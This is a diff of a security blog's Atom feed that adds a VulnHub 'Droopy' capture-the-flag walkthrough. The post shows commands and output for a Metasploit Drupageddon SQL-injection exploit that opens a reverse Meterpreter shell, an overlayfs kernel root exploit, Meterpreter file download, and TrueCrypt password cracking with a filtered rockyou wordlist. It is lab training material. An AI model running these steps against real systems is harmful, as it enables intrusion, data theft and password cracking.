@@ -4,7 +4,7 @@
   <title><![CDATA[Category: penetration testing | Core dump overflow]]></title>
   <link href="http://chousensha.github.io/blog/categories/penetration-testing/atom.xml" rel="self"/>
   <link href="http://chousensha.github.io/"/>
-  <updated>2018-04-22T07:38:20-04:00</updated>
+  <updated>2018-05-04T16:33:13-04:00</updated>
   <id>http://chousensha.github.io/</id>
   <author>
     <name><![CDATA[chousensha]]></name>
@@ -12,6 +12,471 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Dropping Droopy]]></title>
+    <link href="http://chousensha.github.io/blog/2018/05/04/dropping-droopy/"/>
+    <updated>2018-05-04T13:05:08-04:00</updated>
+    <id>http://chousensha.github.io/blog/2018/05/04/dropping-droopy</id>
+    <content type="html"><![CDATA[<p>I&rsquo;m back in the game with preparing for OSCP, and resuming the VulnHub machines. Today&rsquo;s target is Droopy. The author left 2 hints for this challenge:</p>
+
+<p>1.) Grab a copy of the rockyou wordlist.</p>
+
+<p>2.) It&rsquo;s fun to read other people&rsquo;s email.</p>
+
+<!-- more -->
+
+
+<p><code>
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
+</code></p>
+
+<p>Looks like this will be a web-based challenge.</p>
+
+<p><img class="center" src="/images/pentest/droopy.png" title="&lsquo;droopy&rsquo; &lsquo;droopy&rsquo;" ></p>
+
+<p>There are quite a few entries inside robots.txt:</p>
+
+<p>```
+User-agent: *
+Crawl-delay: 10</p>
+
+<h1>Directories</h1>
+
+<p>Disallow: /includes/
+Disallow: /misc/
+Disallow: /modules/
+Disallow: /profiles/
+Disallow: /scripts/
+Disallow: /themes/</p>
+
+<h1>Files</h1>
+
+<p>Disallow: /CHANGELOG.txt
+Disallow: /cron.php
+Disallow: /INSTALL.mysql.txt
+Disallow: /INSTALL.pgsql.txt
+Disallow: /INSTALL.sqlite.txt
+Disallow: /install.php
+Disallow: /INSTALL.txt
+Disallow: /LICENSE.txt
+Disallow: /MAINTAINERS.txt
+Disallow: /update.php
+Disallow: /UPGRADE.txt
+Disallow: /xmlrpc.php</p>
+
+<h1>Paths (clean URLs)</h1>
+
+<p>Disallow: /admin/
+Disallow: /comment/reply/
+Disallow: /filter/tips/
+Disallow: /node/add/
+Disallow: /search/
+Disallow: /user/register/
+Disallow: /user/password/
+Disallow: /user/login/
+Disallow: /user/logout/</p>
+
+<h1>Paths (no clean URLs)</h1>
+
+<p>Disallow: /?q=admin/
+Disallow: /?q=comment/reply/
+Disallow: /?q=filter/tips/
+Disallow: /?q=node/add/
+Disallow: /?q=search/
+Disallow: /?q=user/password/
+Disallow: /?q=user/register/
+Disallow: /?q=user/login/
+Disallow: /?q=user/logout/
+```</p>
+
+<p>Sifting through the entries, I found the exact version on Drupal is 7.30, from the /CHANGELOG.txt file. Googling an exploit for this version led me to..<a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon">Drupageddon</a>!!  Or more official, CVE-2014-3704, which describes a SQL injection vulnerability in Drupal. I fired up Metasploit for the exploit:</p>
+
+<p>```
+msf > use exploit/multi/http/drupal_drupageddon
+msf exploit(drupal_drupageddon) > info</p>
+
+<pre><code>   Name: Drupal HTTP Parameter Key/Value SQL Injection
+ Module: exploit/multi/http/drupal_drupageddon
+</code></pre>
+
+<p>   Platform: PHP</p>
+
+<pre><code>   Arch: php
+</code></pre>
+
+<p> Privileged: No</p>
+
+<pre><code>License: Metasploit Framework License (BSD)
+   Rank: Excellent
+</code></pre>
+
+<p>  Disclosed: 2014-10-15</p>
+
+<p>Provided by:
+  SektionEins
+  Christian Mehlmauer <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#70;&#x69;&#x72;&#x65;&#70;&#x61;&#x72;&#x74;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#111;&#109;">&#x46;&#105;&#114;&#101;&#70;&#x61;&#114;&#x74;&#64;&#x67;&#x6d;&#x61;&#x69;&#x6c;&#46;&#x63;&#111;&#109;</a>
+  Brandon Perry</p>
+
+<p>Available targets:
+  Id  Name</p>
+
+<hr />
+
+<p>  0   Drupal 7.0 &ndash; 7.31</p>
+
+<p>Basic options:
+  Name       Current Setting  Required  Description</p>
+
+<hr />
+
+<p>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
+  RHOST      192.168.217.139  yes       The target address
+  RPORT      80               yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /                yes       The target URI of the Drupal installation
+  VHOST                       no        HTTP server virtual host</p>
+
+<p>Payload information:</p>
+
+<p>Description:
+  This module exploits the Drupal HTTP Parameter Key/Value SQL
+  Injection (aka Drupageddon) in order to achieve a remote shell on
+  the vulnerable instance. This module was tested against Drupal 7.0
+  and 7.31 (was fixed in 7.32).</p>
+
+<p>References:
+  <a href="https://cvedetails.com/cve/CVE-2014-3704/">https://cvedetails.com/cve/CVE-2014-3704/</a>
+  <a href="https://www.drupal.org/SA-CORE-2014-005">https://www.drupal.org/SA-CORE-2014-005</a>
+  <a href="http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html">http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html</a>
+msf exploit(drupal_drupageddon) > exploit</p>
+
+<p>[<em>] Started reverse TCP handler on 192.168.217.132:4444
+[</em>] Testing page
+[<em>] Creating new user yCTZcwgtLV:WLhkIYdDtB
+[</em>] Logging in as yCTZcwgtLV:WLhkIYdDtB
+[<em>] Trying to parse enabled modules
+[</em>] Enabling the PHP filter module
+[<em>] Setting permissions for PHP filter module
+[</em>] Getting tokens from create new article page
+[<em>] Calling preview page. Exploit should trigger&hellip;
+[</em>] Sending stage (37543 bytes) to 192.168.217.139
+[*] Meterpreter session 1 opened (192.168.217.132:4444 &ndash;> 192.168.217.139:51854) at 2018-05-04 13:48:44 -0400
+```</p>
+
+<p>I dropped into a shell and checked the kernel version:</p>
+
+<p><code>
+meterpreter &gt; shell
+Process 1385 created.
+Channel 0 created.
+uname -a
+Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+</code></p>
+
+<p>I ran the 3.13 version through the exploit check part of my <a href="https://github.com/chousensha/linux_privcheck">privcheck</a> script:</p>
+
+<p>```
+python linux_privcheck.py
+Kernel version is 3.13</p>
+
+<h6>#</h6>
+
+<p>POTENTIALLY VULNERABLE TO
+Name: Double-free usb-midi SMEP Local Privilege Escalation
+CVE: CVE-2016-2384
+Source code: <a href="https://www.exploit-db.com/exploits/41999/">https://www.exploit-db.com/exploits/41999/</a></p>
+
+<h6>#</h6>
+
+<h6>#</h6>
+
+<p>POTENTIALLY VULNERABLE TO
+Name: overlayfs Privilege Escalation
+CVE: CVE-2015-1328
+Source code: <a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p>
+
+<h6>#</h6>
+
+<h6>#</h6>
+
+<p>POTENTIALLY VULNERABLE TO
+Name: ptrace/sysret Privilege Escalation
+CVE: CVE-2014-4699
+Source code: <a href="https://www.exploit-db.com/exploits/34134/">https://www.exploit-db.com/exploits/34134/</a></p>
+
+<h6>#</h6>
+
+<h6>#</h6>
+
+<p>POTENTIALLY VULNERABLE TO
+Name: CLONE_NEWUSER|CLONE_FS Privilege Escalation
+CVE: N/A
+Source code: <a href="https://www.exploit-db.com/exploits/38390/">https://www.exploit-db.com/exploits/38390/</a></p>
+
+<h6>#</h6>
+
+<h6>#</h6>
+
+<p>POTENTIALLY VULNERABLE TO
+Name: b43 Wireless Driver Privilege Escalation
+CVE: CVE-2013-2852
+Source code: <a href="https://www.exploit-db.com/exploits/38559/">https://www.exploit-db.com/exploits/38559/</a></p>
+
+<h6>#</h6>
+
+<h6>#</h6>
+
+<p>POTENTIALLY VULNERABLE TO
+Name: open-time Capability file_ns_capable() Privilege Escalation
+CVE: CVE-2013-1959
+Source code: <a href="https://www.exploit-db.com/exploits/25450/">https://www.exploit-db.com/exploits/25450/</a></p>
+
+<h6>#</h6>
+
+<p>```</p>
+
+<p>Ubuntu and overlayfs exploit = PWN! I uploaded the exploit source code to the target via Meterpreter:</p>
+
+<p><code>
+meterpreter &gt; upload /root/37292.c /tmp/
+[*] uploading  : /root/37292.c -&gt; /tmp/
+[*] uploaded   : /root/37292.c -&gt; /tmp//37292.c
+</code></p>
+
+<p>I went back to the shell, and compiled the exploit and made it executable. Droopy is rooted!</p>
+
+<p>```
+gcc 37292.c -o overlayfs
+chmod +x overlayfs
+./overlayfs
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can&rsquo;t access tty; job control turned off</p>
+
+<h1>whoami</h1>
+
+<p>root
+```</p>
+
+<p>But the challenge is not over here. We are root, but remember the hints! We didn&rsquo;t get to do anything with them. I went to the <code>/var/mail</code> directory and found the following message:</p>
+
+<p>```</p>
+
+<h1>cat www-data</h1>
+
+<p>From Dave <a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#58;&#x64;&#x61;&#118;&#101;&#x40;&#100;&#x72;&#x6f;&#x6f;&#112;&#121;&#46;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#x63;&#x6f;&#x6d;">&#100;&#x61;&#x76;&#101;&#x40;&#100;&#x72;&#x6f;&#111;&#112;&#x79;&#46;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#111;&#x6d;</a> Wed Thu 14 Apr 04:34:39 2016
+Date: 14 Apr 2016 04:34:39 +0100
+From: Dave <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x64;&#x61;&#118;&#101;&#x40;&#x64;&#114;&#x6f;&#x6f;&#112;&#x79;&#46;&#x65;&#x78;&#97;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#x6d;">&#x64;&#97;&#x76;&#x65;&#x40;&#x64;&#x72;&#111;&#111;&#112;&#x79;&#46;&#101;&#120;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#x6f;&#109;</a>
+Subject: rockyou with a nice hat!
+Message-ID: <a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#55;&#51;&#x30;&#x32;&#x36;&#50;&#53;&#54;&#x38;&#64;&#x65;&#120;&#97;&#x6d;&#112;&#108;&#101;&#46;&#x63;&#111;&#109;">&#x37;&#51;&#48;&#50;&#x36;&#50;&#53;&#54;&#x38;&#x40;&#101;&#x78;&#97;&#x6d;&#112;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;</a>
+X-IMAP: 0080081351 0000002016
+Status: NN</p>
+
+<p>George,</p>
+
+<p>   I&rsquo;ve updated the encrypted file&hellip; You didn&rsquo;t leave any
+hints for me. The password isn&rsquo;t longer than 11 characters
+and anyway, we know what academy we went to, don&rsquo;t you&hellip;?</p>
+
+<p>I&rsquo;m sure you&rsquo;ll figure it out it won&rsquo;t rockyou too much!</p>
+
+<p>If you are still struggling, remember that song by The Jam</p>
+
+<p>Later,
+Dave
+```</p>
+
+<p>Here it is, another reference to the rockyou list! I&rsquo;ve looked around and found the mentioned encrypted file at <code>/root/dave.tc</code>. The <em>tc</em> extension is for a Truecrypt virtual encrypted disk. So now we know what to crack, and roughly how to do it.</p>
+
+<p>The rockyou.txt file has over 14 million entries, so we&rsquo;re gonna need to make good use of the hints:</p>
+
+<p><code>
+wc -l /usr/share/wordlists/rockyou.txt
+14344392 /usr/share/wordlists/rockyou.txt
+</code></p>
+
+<p>I made a new file with only the entries that were 11 characters long:</p>
+
+<p><code>
+grep -E '^.{11}$' /usr/share/wordlists/rockyou.txt &gt; /root/rocked.txt
+wc -l rocked.txt
+865891 rocked.txt
+</code></p>
+
+<p>And then I created a final file with only the entries that had &ldquo;academy&rdquo; in them:</p>
+
+<p><code>
+grep academy rocked.txt &gt; rockademy.txt
+wc -l rockademy.txt
+16 rockademy.txt
+</code></p>
+
+<p>From over 14 million to 16 entries?! Sounds too good to be true! Let&rsquo;s put it to the test. First, I had to transfer the encrypted file to my machine. I copied <em>dave.tc</em> to /tmp and then downloaded it from there with meterpreter:</p>
+
+<p><code>
+meterpreter &gt; download /tmp/dave.tc
+[*] Downloading: /tmp/dave.tc -&gt; dave.tc
+[*] Downloaded 1.00 MiB of 5.00 MiB (20.0%): /tmp/dave.tc -&gt; dave.tc
+[*] Downloaded 2.00 MiB of 5.00 MiB (40.0%): /tmp/dave.tc -&gt; dave.tc
+[*] Downloaded 3.00 MiB of 5.00 MiB (60.0%): /tmp/dave.tc -&gt; dave.tc
+[*] Downloaded 4.00 MiB of 5.00 MiB (80.0%): /tmp/dave.tc -&gt; dave.tc
+[*] Downloaded 5.00 MiB of 5.00 MiB (100.0%): /tmp/dave.tc -&gt; dave.tc
+[*] download   : /tmp/dave.tc -&gt; dave.tc
+</code></p>
+
+<p>For cracking the file, Kali already comes with TrueCrack preinstalled:</p>
+
+<blockquote><p>TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux
+and it is optimized for Nvidia Cuda technology. It supports:</p>
+
+<p>   PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512
+and Whirlpool.
+   XTS block cipher mode for hard disk encryption based on encryption algorithms: AES,
+SERPENT, TWOFISH.
+   File-hosted (container) and Partition/device-hosted.
+   Hidden volumes and Backup headers.</p>
+
+<p>TrueCrack is able to perform a brute-force attack based on:</p>
+
+<p>   Dictionary: read the passwords from a file of words.
+   Alphabet: generate all passwords of given length from given alphabet.</p>
+
+<p>TrueCrack works on gpu and cpu</p></blockquote>
+
+<p>```
+truecrack
+TrueCrack v3.0
+Website: <a href="http://code.google.com/p/truecrack">http://code.google.com/p/truecrack</a>
+Contact us: <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x69;&#x6e;&#102;&#111;&#x74;&#x72;&#x75;&#x65;&#x63;&#x72;&#x61;&#99;&#x6b;&#x40;&#x67;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#111;&#109;">&#x69;&#110;&#x66;&#111;&#x74;&#114;&#x75;&#x65;&#x63;&#114;&#97;&#99;&#107;&#x40;&#x67;&#x6d;&#97;&#105;&#108;&#x2e;&#x63;&#x6f;&#109;</a>
+Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
+Based on TrueCrypt, freely available at <a href="http://www.truecrypt.org/">http://www.truecrypt.org/</a>
+Copyright &copy; 2011 by Luca Vaccaro.</p>
+
+<p>Usage:
+ truecrack -t &lt;truecrypt_file> -k &lt;ripemd160|sha512|whirlpool> -w &lt;wordlist_file> [-b &lt;parallel_block>]
+ truecrack -t &lt;truecrypt_file> -k &lt;ripemd160|sha512|whirlpool> -c <charset> [-s <minlength>] -m <maxlength> [-b &lt;parallel_block>]</p>
+
+<p>Options:
+ -h &mdash;help                      Display this information.
+ -t &mdash;truecrypt &lt;truecrypt_file>    Truecrypt volume file.
+ -k &mdash;key <ripemd160 | sha512 | whirlpool>      Key derivation function (default ripemd160).
+ -b &mdash;blocksize &lt;parallel_blocks>       Number of parallel computations (board dependent).
+ -w &mdash;wordlist &lt;wordlist_file>      File of words, for Dictionary attack.
+ -c &mdash;charset <alphabet>        Alphabet generator, for Alphabet attack.
+ -s &mdash;startlength <minlength>       Starting length of passwords, for Alphabet attack (default 1).
+ -m &mdash;maxlength <maxlength>     Maximum length of passwords, for Alphabet attack.
+ -r &mdash;restore <number>          Restore the computation.
+ -v &mdash;verbose                   Show computation messages.</p>
+
+<p>Sample:
+ Dictionary mode: truecrack &mdash;truecrypt ./volume &mdash;wordlist ./dictionary.txt
+ Charset mode: truecrack &mdash;truecrypt ./volume &mdash;charset ./dictionary.txt &mdash;maxlength 10
+```</p>
+
+<p>The moment of truth! It didn&rsquo;t work the first try, but then I specified the key function as SHA512:</p>
+
+<p><code>
+truecrack --truecrypt dave.tc -k sha512 --wordlist rockademy.txt
+TrueCrack v3.0
+Website: http://code.google.com/p/truecrack
+Contact us: infotruecrack@gmail.com
+Found password:     "etonacademy"
+Password length:    "12"
+Total computations: "10"
+</code></p>
+
+<p>It worked! Now all that remains is to open the volume and snoop around:</p>
+
+<p><code>
+cryptsetup open --type tcrypt dave.tc hidden
+Enter passphrase:
+mkdir -p /mnt/tcrypt
+mount /dev/mapper/hidden /mnt/tcrypt/
+root@kali:/mnt/tcrypt# ls -la
+total 20
+drwxr-xr-x 6 root root  1024 Apr 12  2016 .
+drwxr-xr-x 6 root root  4096 May  4 16:20 ..
+drwxr-xr-x 2 root root  1024 Apr 12  2016 buller
+drwx------ 2 root root 12288 Apr 12  2016 lost+found
+drwxr-xr-x 2 root root  1024 Apr 12  2016 panama
+drwxr-xr-x 3 root root  1024 Apr 12  2016 .secret
+</code></p>
+
+<p>A hidden directory..with another hidden directory inside it:</p>
+
+<p><code>
+root@kali:/mnt/tcrypt/.secret# ls -la
+total 64
+drwxr-xr-x 3 root root  1024 Apr 12  2016 .
+drwxr-xr-x 6 root root  1024 Apr 12  2016 ..
+-rw-r--r-- 1 root root 61118 Feb 25  2016 piers.png
+drwxr-xr-x 2 root root  1024 Apr 12  2016 .top
+</code></p>
+
+<p>And finally, the flag!</p>
+
+<p>```
+root@kali:/mnt/tcrypt/.secret/.top# cat flag.txt</p>
+
+<h6>#</h6>
+
+<h1><strong><em> </em></strong>  _  _  <strong><em> </em></strong>    _ <strong><strong><em> _   _ _      _ </em></strong></strong> <strong><em> </em></strong>  _  _  ___</h1>
+
+<h1>/ <strong>/ _ \| \| |/ </strong>| _ \  /<em>_   </em>| | | | |    /<em>_   </em>|<em> </em>/ _ \| \| |/ __|</h1>
+
+<h1>| (<em>| (</em>) | .<code>| (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .</code> |__ \</h1>
+
+<h1>_<strong>_</strong>/|<em>|_|___|</em>|<em>\/</em>/ __|  _<strong>/|</strong><strong>/<em>/ __| |</em></strong>_<strong>/|<em>|_||</em></strong>/</h1>
+
+<h1>#</h1>
+
+<h6>#</h6>
+
+<p>Firstly, thanks for trying this VM. If you have rooted it, well done!</p>
+
+<p>Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
+goes to barrebas and junken for help in testing and final configuration.</p>
+
+<pre><code>                                                                --knightmare
+</code></pre>
+
+<p>```</p>
+
+<p>Nice challenge that involved adjusting a wordlist and TrueCrypt cracking! It rocked!</p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ You will be awarded a medal for        \
+\ disregarding safety in saving someone. /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Pwning Kevgir]]></title>
@@ -305,7 +770,7 @@ Archive:  backup.tar.bz2.zip
 fcrackzip &mdash;help</p>
 
 <p>fcrackzip version 1.0, a fast/free zip password cracker
-written by Marc Lehmann <a href="&#109;&#x61;&#x69;&#108;&#116;&#x6f;&#58;&#112;&#99;&#x67;&#64;&#x67;&#111;&#111;&#102;&#46;&#x63;&#x6f;&#109;">&#112;&#99;&#x67;&#64;&#x67;&#111;&#111;&#x66;&#46;&#99;&#x6f;&#109;</a> You can find more info on
+written by Marc Lehmann <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#112;&#99;&#103;&#x40;&#103;&#x6f;&#x6f;&#x66;&#x2e;&#x63;&#111;&#x6d;">&#x70;&#99;&#103;&#64;&#x67;&#111;&#111;&#x66;&#x2e;&#99;&#111;&#109;</a> You can find more info on
 <a href="http://www.goof.com/pcg/marc/">http://www.goof.com/pcg/marc/</a></p>
 
 <p>USAGE: fcrackzip</p>
@@ -2519,129 +2984,6 @@ dnsrecon -d zonetransfer.me -z
 | not.                                    |
 |                                         |
 \ &mdash; Mark Twain                           /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[netmask - Kali Linux tools]]></title>
-    <link href="http://chousensha.github.io/blog/2017/07/07/netmask-kali-linux-tools/"/>
-    <updated>2017-07-07T05:55:22-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/07/07/netmask-kali-linux-tools</id>
-    <content type="html"><![CDATA[<p><strong>Objective</strong>: you want to convert between different types of netmasks and network addresses, or generate optimized netmasks for firewall rules. netmask can take care of your netmasks!</p>
-
-<p>Homepage: <a href="https://github.com/tlby/netmask">https://github.com/tlby/netmask</a></p>
-
-<!-- more -->
-
-
-<h2>netmask description</h2>
-
-<blockquote><p>This  program  accepts and produces a variety of common network address
-and netmask formats.  Not only can it convert address and netmask notations,  but it will optimize the masks to
-generate the smallest list of rules.  This is very handy if you&rsquo;ve  ever  configured  a  firewall  or
-router  and  some  nasty  network administrator before you decided that
-base 10 numbers were good places to start and end groups of machines.</p></blockquote>
-
-<p>Manpage: <a href="https://linux.die.net/man/1/netmask">https://linux.die.net/man/1/netmask</a></p>
-
-<h2>netmask options</h2>
-
-<p>```
-This is netmask, an address netmask generation utility
-Usage: netmask spec [spec &hellip;]
-  -h, &mdash;help            Print a summary of the options
-  -v, &mdash;version         Print the version number
-  -d, &mdash;debug           Print status/progress information
-  -s, &mdash;standard        Output address/netmask pairs
-  -c, &mdash;cidr            Output CIDR format address lists
-  -i, &mdash;cisco           Output Cisco style address lists
-  -r, &mdash;range           Output ip address ranges
-  -x, &mdash;hex         Output address/netmask pairs in hex
-  -o, &mdash;octal           Output address/netmask pairs in octal
-  -b, &mdash;binary          Output address/netmask pairs in binary
-  -n, &mdash;nodns           Disable DNS lookups for addresses
-  -f, &mdash;files           Treat arguments as input files
-Definitions:
-  a spec can be any of:</p>
-
-<pre><code>address
-address:address
-address:+address
-address/mask
-</code></pre>
-
-<p>  an address can be any of:</p>
-
-<pre><code>N       decimal number
-0N      octal number
-0xN     hex number
-N.N.N.N dotted quad
-hostname    dns domain name
-</code></pre>
-
-<p>  a mask is the number of bits set to one from the left
-```</p>
-
-<h2>netmask usage</h2>
-
-<ul>
-<li>output standard address / netmask pairs</li>
-</ul>
-
-
-<p><code>
-root@kali:~# netmask -s 192.168.217.0/24
-  192.168.217.0/255.255.255.0  
-</code></p>
-
-<ul>
-<li>CIDR notation</li>
-</ul>
-
-
-<p><code>
-root@kali:~# netmask -c google.com
-  216.58.210.14/32
-2a00:1450:4001:81d::200e/128
-</code></p>
-
-<ul>
-<li>Cisco-style notation</li>
-</ul>
-
-
-<p><code>
-root@kali:~# netmask -i google.com
-  216.58.210.14 0.0.0.0        
-2a00:1450:4001:81d::200e ::   
-</code></p>
-
-<ul>
-<li>IP ranges</li>
-</ul>
-
-
-<p><code>
-root@kali:~# netmask -r 192.168.217.0/24
-  192.168.217.0-192.168.217.255 (256)
-</code></p>
-
-<p>```</p>
-
-<hr />
-
-<p>&lt; Your ignorance cramps my conversation. ></p>
 
 <hr />
 
